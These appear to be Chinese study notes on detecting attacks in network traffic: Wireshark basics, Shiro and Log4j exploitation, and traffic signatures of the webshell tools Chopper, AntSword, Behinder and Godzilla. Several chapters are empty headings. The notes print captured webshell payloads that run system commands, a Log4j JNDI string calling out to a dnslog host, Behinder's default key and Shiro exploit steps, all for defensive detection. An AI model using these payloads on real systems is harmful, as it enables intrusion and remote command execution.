---
title: 流量分析
---



# 					第一章  wireshark安装与使用

## 1.wireshark基础

### 1.1.wireshark介绍

​		wireshark是非常流行的网络封包分析软件，简称小鲨鱼，功能十分强大，可以截取各种网络数据包，显示数据包的详细信息。

​		wireshark是开源软件，可以放心使用，可以运行在windows和mac os上，linux下的抓包工具是tcpdump，使用wireshark必须了解HTTP/HTTPS协议，否则就看不懂wireshark的内容。

### 1.2.下载

```
https://www.wireshark.org
```

### 1.3.应用场景

```
1. 网络管理员会使用wireshark来检查网络问题
2. 软件测试工程师使用wireshark抓包，来分析自己测试的软件
3. 从事socket编程的工程师会用wireshark来调试
4. 运维人员用于日常工作，应急响应等等
```

### 1.4.wireshark抓包原理

​		wireshark使用winPCAP作为接口，直接与网卡进行数据报文交换。wireshark使用的环境大致分为两种

# 					第二章  TOP10漏洞流量特征

# 					第三章  中间件漏洞流量特征

# 					第四章  组件漏洞流量特征

# 					第五章  框架漏洞流量特征

## 1.shiro反序列化漏洞

### 1.1.原理

​		Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞那么，Payload产生的过程：命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie值在整个漏洞利用过程中，比较重要的是AES加密的密钥如果没有修改默认的密钥那么就很容易就知道密钥了。

### 1.2.利用过程

```
1.构造Payload：攻击者首先需要将恶意代码序列化为字节流。
2.AES加密：然后，使用Shiro默认的AES密钥对这个字节流进行加密。
3.Base64编码：接着，对加密后的字节流进行Base64编码，使其可以作为cookie值的一部分。
4.设置Cookie：最后，将这个Base64编码后的值设置为rememberMe cookie的值，并将其发送给目标服务器。
```

​		当目标服务器接收到这个恶意的rememberMe cookie时，它会尝试对其进行解密和反序列化，从而触发漏洞，执行攻击者指定的恶意代码。

### 1.3.Shiro550与Shiro721的区别

​		Shiro550：这个漏洞利用了已知密钥碰撞,不需要真实的rememberMe cookie，只需要有足够的密钥库来尝试碰撞。

​		Shiro721：在这个版本中，AES加密的密钥不再是硬编码的，而是系统随机生成的。这使得攻击者很难直接猜到正确的密钥。然而仍然可以利用登录后的有效rememberMe cookie作为Padding Oracle Attack的前缀，通过精心构造的cookie值来实现反序列化漏洞攻击。

### 1.4.流量特征

```
1.未登录状态：请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段。
2.登录失败：无论是否勾选RememberMe，返回包都会有rememberMe=deleteMe字段。
3.不勾选RememberMe登录成功：返回包set-Cookie会有rememberMe=deleteMe字段，但后续请求中Cookie不会有rememberMe字段。
4.勾选RememberMe登录成功：返回包set-Cookie会有rememberMe=deleteMe字段和rememberMe字段，后续请求中Cookie也会有rememberMe字段。
```

## 2.Log4j漏洞

### 2.1.原理

​		Apache Log4j2 框架中存在一个名为 JNDI Lookup 的功能，它允许通过配置文件中的 JNDI 名称引用外部资源。lookup功能的实现类 JndiLookup 的设计缺陷导致，启动一个JNDI服务，通过rmi注册一个恶意实例，使用lookup远程加载导致RCE${jndi:ldap://log4j.voxxaq.dnslog.cn}，构造一个特殊的日志消息，其中包含恶意的 JNDI 名称，并通过网络发送给受影响的应用程序。当应用程序使用 Log4j2 框架解析日志消息时，它会尝试查找和引用该 JNDI 名称。如果恶意的 JNDI 名称指向一个恶意的远程资源，例如恶意的 LDAP 服务器或  RMI 服务，攻击者可以控制该远程资源的内容和行为。攻击者可以在恶意的远程资源中注入恶意代码，并在目标系统上执行任意命令或获取敏感信息。

### 2.2.流量特征

```
1.dnslog类：查看是否存在源ip与dnslog的外联日志记录
2.数据包里有{jndi:ladp//}字段
3.命令执行攻击
4.有回显响应体中存在命令执行结果;无回显存在源ip与ldap服务ip的外联日志记录。
```

# 					第六章  webshell管理工具流量特征

## 1.菜刀流量特征

​		通过抓包发现菜刀流量特征如下：

```
123=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=Y21k&z2=Y2QgL2QgIkM6XHBocFN0dWR5XFdXV1wiJmlwY29uZmlnJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
```

​		明显的特征是eval，第二个特征是base64_decode。第三个特征是将`%28%24_POST%5Bz0%5D%29%29%3B`进行URL解码发现为`($_POST[z0]));`。然后&z0进行传值，该部分是传递攻击payload，此参数z0对应$_POST[z0]接收到的数据，该参数值是使用base64编码的，所以可以利用base64解码可以看到攻击明文。

​		需要注意的是z0是菜刀默认的参数，这个可能会被修改为其他参数z1、z2。连接建立后，会发送特定的验证码，如“knife”或“dadan”等进行验证。

## 2.蚁剑流量特征

​		通过抓包发现蚁剑流量特征如下：

```
123=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3B%24opdir%3D%40ini_get(%22open_basedir%22)%3Bif(%24opdir)%20%7B%24ocwd%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24oparr%3Dpreg_split(base64_decode(%22Lzt8Oi8%3D%22)%2C%24opdir)%3B%40array_push(%24oparr%2C%24ocwd%2Csys_get_temp_dir())%3Bforeach(%24oparr%20as%20%24item)%20%7Bif(!%40is_writable(%24item))%7Bcontinue%3B%7D%3B%24tmdir%3D%24item.%22%2F.940bf2226%22%3B%40mkdir(%24tmdir)%3Bif(!%40file_exists(%24tmdir))%7Bcontinue%3B%7D%24tmdir%3Drealpath(%24tmdir)%3B%40chdir(%24tmdir)%3B%40ini_set(%22open_basedir%22%2C%20%22..%22)%3B%24cntarr%3D%40preg_split(%22%2F%5C%5C%5C%5C%7C%5C%2F%2F%22%2C%24tmdir)%3Bfor(%24i%3D0%3B%24i%3Csizeof(%24cntarr)%3B%24i%2B%2B)%7B%40chdir(%22..%22)%3B%7D%3B%40ini_set(%22open_basedir%22%2C%22%2F%22)%3B%40rmdir(%24tmdir)%3Bbreak%3B%7D%3B%7D%3B%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%227fa%22.%22480%22%3Becho%20%40asenc(%24output)%3Becho%20%2209ab%22.%22f6e8f%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B
```

​		默认的User-Agent请求头：蚁剑的默认User-Agent请求头通常为“antsword xxx”，但这个值是可以修改的。		

​		抓取此工具的流量时需要注意的是可能出现并非上述效果的结果，所以多选择几个即可抓取到。进行URL解码后会发现请求体中存在`@ini_set("display_errors","0");@set_time_limit(0);$opdir=@ini_get("open_basedir")`特征。

​		webshell静态与动态特征：

```
1.在使用蚁剑上传和管理Webshell时，不同的脚本语言（如PHP、ASP、JSP）会展现出不同的静态特征。例如，PHP中可能使用assert、eval执行代码，而ASP则主要依赖eval执行。
2.动态特征方面，通过上传Webshell并抓包分析，可以发现每个请求体都包含特定的代码片段（如上述的@ini_set等），并且响应体通常会进行base64编码混淆，解码后，可以观察到攻击行为的payload。
```

​		由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x.....=”这种形式（下划线可替换为其他）所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。

## 3.冰蝎特征

### 3.1.冰蝎2.0流量特征

```
1.请求头部：User-Agent字段可能表现出多样性,因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。
2.请求体：通常使用AES加密，并通过base64编码进行传输
3.Cookie字段：建立连接后，所有请求的Cookie格式通常为Cookie: PHPSESSID=; path=/;
4.返回包特征：在建立连接的初始阶段，返回包中通常包含16位的密钥，用于后续的通信加密。
5.数据包结构：具有特定的结构特征，如通常以0x01开头，以0x00结尾，中间包含蝎子协议特征数据
```

### 3.2.冰蝎3.0流量特征

```
1.加密与编码：
1.1.使用AES加密 + base64编码,
1.2.取消了2.0的动态获取密钥，使用固定的连接密钥，AES加密的密钥为webshell连接密码的MD5的前16位。默认连接密码是"rebeyond"(即密钥是md5('rebeyond')[0:16]=e45e329feb5d925b)。
2.User-Agent多样性：进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。
3.Content-Type字段：当冰蝎3.0连接jsp的webshell时，请求数据包中的Content-Type字段常见为“application/octet-stream”。
4.请求头字段：冰蝎3.0的请求包中还可能包含其他特定的请求头字段，如“Pragma: no-cache”和“Cache-Control: no-cache”，用于控制缓存行为。
5.ontent-length字段：通常为5740或5720，但这一数值可能会根据Java版本的不同而有所变化。同时，请求头中仍然包含随机选择的User-Agent，以增加流量的隐蔽性。
6.连接jsp的webshell的请求数据包中的content-type字段常见为application/octet-stream。
```

### 3.3.冰蝎4.0流量特征

```
1.提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。
2.Accept字段（弱特征），通常是Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可接受任何文件，但最倾向application/json 和 text/javascript。
3.Content-Type字段（弱特征），通常是Content-type: Application/x-www-form-urlencoded
4.与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。
5.连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。
6.使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive
7.有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd
8.默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。
```

## 4.哥斯拉流量特征

​		抓包发现哥斯拉流量特征如下：

```
pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTt1UCWCn3LmDlfWRkKzUxH296rG6bPHo09BeXHfTJgteEyihShCCauIyreD4nRQmw3JlHIZgQHbiMm37oIY7KI8z5rMHYgOpIHDLTFWgjMDZlMA%3D%3D
```

​		在默认脚本的编码情况下，jsp会出现xc、pass字符和java反射(ClassLoader、getClass().getClassLoader())，base64加解码等特征。

​		哥斯拉的动态特征主要有以下几点：

```
1.user-agent字段，如果采用默认情况，会暴露jdk信息，不过哥斯拉支持自定义http头，这个默认特征可以去除。
2.Accept字段（弱特征），默认是Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。同上，这个也可修改，只能作为辅助检测的特征。
3.cookie字段：最后会有一个分号。
4.响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体特征为：md5前十六位+base64+md5后十六位
```

​		md5解密网站：

```
https://www.somd5.com/
```

# 					第七章  内网渗透工具流量特征

## 1.Cobaltstrike流量特征分析



